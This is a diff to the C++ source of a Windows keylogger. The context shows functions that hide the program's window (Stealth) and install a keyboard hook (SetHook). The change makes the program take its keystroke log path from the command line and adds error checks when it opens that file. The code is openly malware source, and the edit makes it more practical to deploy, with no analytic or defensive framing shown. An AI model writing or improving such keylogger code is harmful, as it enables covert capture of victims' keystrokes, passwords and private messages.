@@ -276,8 +276,16 @@ bool IsSystemBooting()
 	return GetSystemMetrics(0x2004) != 0;
 }
 
-int main()
+int main(int argc, char* argv[])
 {
+	// Check if the user provided an output file path
+    if (argc < 2)
+    {
+        // Print to standard error so the user sees this in the .out file
+        std::cerr << "Error: No output file path provided." << std::endl;
+        return 1; // Exit with an error code
+    }
+
 	// Call the visibility of window function.
 	Stealth();
 
@@ -298,9 +306,15 @@ int main()
 
 	// Open the output file in append mode.
 	// Feel free to rename this output file.
-	const char* output_filename = "keylogger.log";
+	const char* output_filename = argv[1]; // Use the first argument as the file path
 	std::cout << "Logging output to " << output_filename << std::endl;
 	output_file.open(output_filename, std::ios_base::app);
+
+	if (!output_file.is_open())
+    {
+        std::cerr << "Error: Could not open log file: " << output_filename << std::endl;
+        return 1;
+    }
 
 	// Call the hook function and set the hook.
 	SetHook();
